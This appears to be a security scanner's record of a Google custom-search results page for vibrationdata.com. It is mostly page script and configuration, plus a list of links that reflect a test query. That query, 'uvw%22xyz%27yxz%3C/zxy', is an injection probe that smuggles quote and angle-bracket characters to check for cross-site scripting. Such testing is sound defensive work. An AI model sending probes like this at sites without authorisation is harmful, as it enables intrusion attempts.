+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22EsJgGXIGZpoWqUPGuvpkBw10Bv4\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","iw6RWyb2TO8g","r-iw6RWyb2TO8g",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['AK9Hrk','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22site:(uvw%22xyz%27yxz%3C/zxy\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22EsJgGXIGZpoWqUPGuvpkBw10Bv4\x22,\x22\x22,\x22JVWUXvaVK4yQ4-EPxIe3yA0\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','AK9Hro','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22site:(uvw%22xyz%27yxz%3C/zxy\x22]\n,[\x22safe\x22,\x22active\x22]\n,[\x22client\x22,\x22pub-1751731975287442\x22]\n,[\x22domains\x22,\x22www.vibrationdata.com\x22]\n,[\x22ie\x22,\x22ISO-8859-1\x22]\n,[\x22oe\x22,\x22ISO-8859-1\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026safe\\u003dactive\\u0026client\\u003dpub-1751731975287442\\u0026domains\\u003dwww.vibrationdata.com\\u0026oe\\u003dISO-8859-1\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','AK9Hrs','[0,\x22inline\x22,2,2500,0,0]\n','AK9Hrw','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586779429\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','AK9Hr0','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9zts4TBEL8CNlGxnVOxlqaYhB-PMJMg:1586779429831\x22,3]\n','AK9Hr4','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586779429707318,104384524,3641557956]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"j9M8nchnLxoNoNihRFNSsQ\u003d\u003d","kvKIW":"false","vhCwfc":"false","v44rSc":"#70757a","JyBo2c":"false","RJegIe":"#fffff0","iKzRxb":"#5f6368","RZ03Ve":"#5677fc","AP8pqf":"rgba(0,0,0,.12)","WxHUzd":"true","seVajd":"rgba(0,0,0,.12)","Vdtb3d":"true","khoEPb":"#1a0dab","LACYrf":"false","ue6nDb":"Roboto-Medium,Roboto-Regular","BwgO5":"16","u4NTBb":"40","KgXmrd":"true","rx1dvd":"#f3f3f3","NIYCKf":"28","k7G1xb":"15","jg5SCd":"false","rZYUef":"#f5f5f5","kL6Xwb":"false","aD6AQe":"#757575","in3Ilb":"#222","cdRSXc":"false","tqmosb":"#fff","dTMnbc":"false","vIMrp":"true","pch72b":"false","ZzVVh":"false","TKn0F":"20px","NW4nA":"rgba(255,255,255,.7)","ToXxme":"#e5e5e5","ekXXzb":"13px","n1Whrf":"false","hgWJ8c":"false","EiEfXb":"#ebebeb","PIn0Ab":"1px solid #DFE1E5","q7vEEb":"false","ConpTc":"false","s6Rzec":"0 16px","F4ULTd":"true","GTYTQ":"#ffeb3b","ENmP1c":"rgba(204,204,204,.15)","QldWK":"6","y2Hs7d":"false","lVRwic":"false","o9mzkf":"false","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","UNVSy":"false","LIYDac":"arial,sans-serif","UnFEre":"16","nMRhJe":"false","EJG4vf":"pointer","hbfefd":"#1A73E8","VnH1Zb":"normal","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","PuOePe":"false","imHXAf":"true","KVmtZc":"rgba(255,255,255,.3)","hqg9c":"#1878f0","Hzi6pf":"#DFE1E5","xDKXr":"false","JcUGee":"rgba(0,0,0,.54)","rRLesf":"0","SATNMc":"1px solid #dfe1e5","X1bUEc":"arial,sans-serif-medium,sans-serif","ruHO7c":"#dd191d","pDiOce":"false","T1V3fc":"#f4b400","GzC2p":"#fff","tqXjO":"false","FF58Bf":"true","K2vQjf":"#f8f8f8","gjAni":"#3c4043","FYBlgf":"false","Sgnmlc":"14px","BYw9f":"false","QSF9Ec":"","LnZAkd":"false","fFepd":"-15","Rnt1Qc":"false","uRoR4d":"false","S7nbec":"16","SuQiSc":"1.3","o28sBd":"false","OqjdAf":"true","iniaFd":"true","wlwuHd":"false","y519we":"true","bXvyY":"#fff","pPtK5":"6","SfSmD":"#ebebeb","lzJv9d":"#fff","fQC6Cf":"2px","ZLr84e":"true","QDXUyc":"#188038","p7BdKe":"true","gqXETb":"#db4437","XgWQKd":"true","JRGsye":"none","U6xP0":"#4285f4","ODgkgd":"#fff","jIrJIf":"14","haqSDf":"rgba(0,0,0,.54)","QnH6ad":"16","KTkDB":"false","FiZWae":"32","kVbEH":"false","Tae7A":"true","WWz0vd":"false","wB1JTc":"false","aKuscd":"#AECBFA","KdGe5c":"false","ppkaeb":"0","pxDH4c":"#0f9d58","tJ4Jdf":"11","B0husb":"true","hWyTvf":"false","xz9C5b":"true","AYVQWe":"20px","WnrBce":"rgba(0,0,0,.1)","KD9WYe":"#1A73E8","SpZHZd":"true","X4DPRd":"true","FbN3Qc":"rgba(0,0,0,.87)","A5tF3b":"false","V0Bluc":"none","ZMFELd":"false","N31mf":"false","xBx7Dc":"36","g635Ab":"2px","abZ6pc":"#f9a825","AEMHld":"#eeeeee","RpI44b":"#ebebeb","eXPt4e":"400","HjM8R":"#FFF","i7mh3e":"16","kePaAc":"-4","IvNqzc":"true","a7rhWc":"false","S1ZUDf":"true","MOPyub":"15","OjG6Qc":"#000","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","QA73ad":"false","tyCgpc":"#fff","AwPxw":"false","pLhKvc":"0","eo8dye":"#878787","oFa0q":"#fafafa","zHtpPb":"false","YXGVrd":"true","JpB3Ue":"60","bmAEG":"#d9d9d9","ZxI7Af":"#fafafa","srQSvc":"true","kkVYtc":"false","VbmVYd":"true","gir54":"0.4","BW8dtd":"rgba(248, 248, 248, 1)","ib0wve":"rgba(153,153,153,.2)","D8A8he":"true","bVUXme":"25","auaxA":"#222","qmiCId":"true","aUt4Tc":"false","fjc61":"false","j0DpSe":"false","fRkoq":"true","Vzh4p":"0px 7px 6px -5px #DFE1E5","prFQBe":"#ebebeb","bmQ7Rb":"false","o07h3e":"0 4px 5px rgba(0,0,0,.16)","iwHJId":"15","b1KZw":"#fff","xeVOLe":"#689f38","By1ejd":"16","klgere":"invert(1) hue-rotate(180deg)","JVBnre":"false","Dc0uuf":"16","lLCPB":"true","h29koe":"32","eE52Jd":"#5f6368","sPiebd":"false","buGAI":"16","yFVHo":"true","iDTSkb":"true","rWPbFe":"rgba(255,255,255,1)","sBpVac":"rgba(0,0,0,.26)","iryGqc":"2","HWmJg":"#dcdcdc","voc95c":"false","gbf9Eb":"58","Ym5Ycb":"false","zhBJde":"false","BdVmgf":"16","EuCkcd":"16","xFbXr":"rgba(0,102,33,1)","a8Umdd":"rgba(153,153,153,.4)","mJempe":"13","L6WyEf":"true","YWHUvb":"18px","j9ZYRc":"true","SezQgf":"500","umYEvb":"false","MiTaT":"#1A73E8","qkXvHd":"500","AYXCHc":"false","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","W445Dc":"20","dAFa0e":"false","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","Utapxe":"-webkit-","qj36Ef":"#323232","owXwYb":"#f8f8f8","bDOvJc":"false","TUhOL":"#fafafa","NvsKMd":"true","I69zkb":"rgba(204,204,204,.25)","xvI8we":"#212121","e2p8ee":"false","A2aVpb":"50","PxA5sf":"rgba(0,0,0,.54)","KFdH8":"true","V6eh7c":"16","PngPbb":"rgba(0,0,0,.87)","Na6wt":"#e1e1e1","osNyZ":"1.0","Nk1Bhf":"#4285f4","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","z70S0c":"false","VXIo7d":"8px","EqX55c":"652","KnXmRc":"10","IfHuyb":"rgba(0,0,0,.54)","z1x4kc":"true","y1HZEd":"false","Fcb4A":"#1A73E8","wku5sd":"false","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","B8Dib":"rgba(0,0,0,.87)","SidP2e":"rgba(248, 248, 248, 0)","ymIfqf":"18","FydCC":"true","X4yPd":"#1c3aa9","VQfWj":"#c0c0c0","wFGKdc":"false","WMBRj":"#009688","Mlljec":"false","BoqNoc":"20px","rX9Pnb":"16","tpLZye":"#fff","tuTJ6d":"#b8b8b8","EgTnfe":"true","R9GQh":"#fff","oyB9kf":"rgba(0,0,0,.87)","xT28q":"false","MoAfyf":"#fff","PYrjqe":"40","AQEr7b":"#c6c6c6","rsd6be":"1","eGDqv":"false"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","j9M8nchnLxoNoNihRFNSsQ\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586779429707318,104384524,3641557956]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw3zip1lbWdHnZDFXDcTIpG-\x26ust\x3d1586865829750695';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQpwV6BAgBEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQpwV6BAgBEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQpwV6BAgBEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQpwV6BAgBEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQpwV6BAgBEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQpwV6BAgBEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x22site:(uvw%22xyz%27yxz%3C/zxy\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22safe\x22 value\x3d\x22active\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22client\x22 value\x3d\x22pub-1751731975287442\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22domains\x22 value\x3d\x22www.vibrationdata.com\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22ie\x22 value\x3d\x22ISO-8859-1\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22oe\x22 value\x3d\x22ISO-8859-1\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;safe\x3dactive\x26amp;client\x3dpub-1751731975287442\x26amp;domains\x3dwww.vibrationdata.com\x26amp;oe\x3dISO-8859-1\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQpwV6BAgBEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [13]
+<a href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;gbv=1&amp;sei=JVWUXvaVK4yQ4-EPxIe3yA0">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fdomains%3Dwww.vibrationdata.com%26q%3D%26sitesearch%3D(uvw%2522xyz%27yxz%253C/zxy%26client%3Dpub-1751731975287442%26forid%3D1%26ie%3DISO-8859-1%26oe%3DISO-8859-1%26safe%3Dactive%26cof%3DGALT:" target="_top">
+<a class="q qs" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQ_AUoAXoECAEQAw">
+<a class="q qs" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQ_AUoAnoECAEQBA">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQ_AUoAHoECAEQBg">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQ_AUoAXoECAEQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;safe=active&amp;client=pub-1751731975287442&amp;domains=www.vibrationdata.com&amp;oe=ISO-8859-1&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwi2vPqBruXoAhUMyDgGHcTDDdkQ_AUoAnoECAEQCA">
